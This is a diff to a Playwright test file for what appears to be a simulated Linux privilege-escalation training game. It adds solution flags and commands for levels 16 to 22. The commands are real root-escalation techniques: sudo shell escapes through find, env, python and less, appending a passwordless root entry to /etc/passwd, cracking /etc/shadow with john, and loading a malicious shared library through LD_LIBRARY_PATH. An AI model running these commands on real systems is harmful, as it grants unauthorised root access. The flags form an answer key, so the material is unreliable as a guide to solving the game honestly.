@@ -17,7 +17,14 @@ const SOLUTIONS = {
     12: { flag: 'flag{w1ldcard_tar_ch3ckpoint}', cmds: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'] },
     13: { flag: 'flag{r00t_ssh_key_l00t}', cmds: ['ssh -i /opt/backup/id_rsa root@localhost'] },
     14: { flag: 'flag{sud0ers_d_dr0pin}', cmds: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'] },
-    15: { flag: 'flag{ld_s0_preload_glob4l}', final: true, cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'] },
+    15: { flag: 'flag{ld_s0_preload_glob4l}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'] },
+    16: { flag: 'flag{sud0_find_rebo0t}', cmds: ['sudo find . -exec /bin/sh \\;'] },
+    17: { flag: 'flag{env_v4r_r00t}', cmds: ['sudo env /bin/sh'] },
+    18: { flag: 'flag{pyth0n_0s_syst3m}', cmds: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"] },
+    19: { flag: 'flag{l3ss_is_r00t}', cmds: ['sudo less !/bin/sh'] },
+    20: { flag: 'flag{te3_p1ped_r00t}', cmds: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'] },
+    21: { flag: 'flag{cap_dac_sh4d0w_pwn}', cmds: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'] },
+    22: { flag: 'flag{ld_l1brary_p4th_pwn}', final: true, cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'] },
 };
 
 async function enter(page, id) {
@@ -47,11 +54,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 15 machines across 3 tiers', async ({ page }) => {
+test('hub renders 22 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(15);
+    await expect(page.locator('.machine-card')).toHaveCount(22);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 15');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 22');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
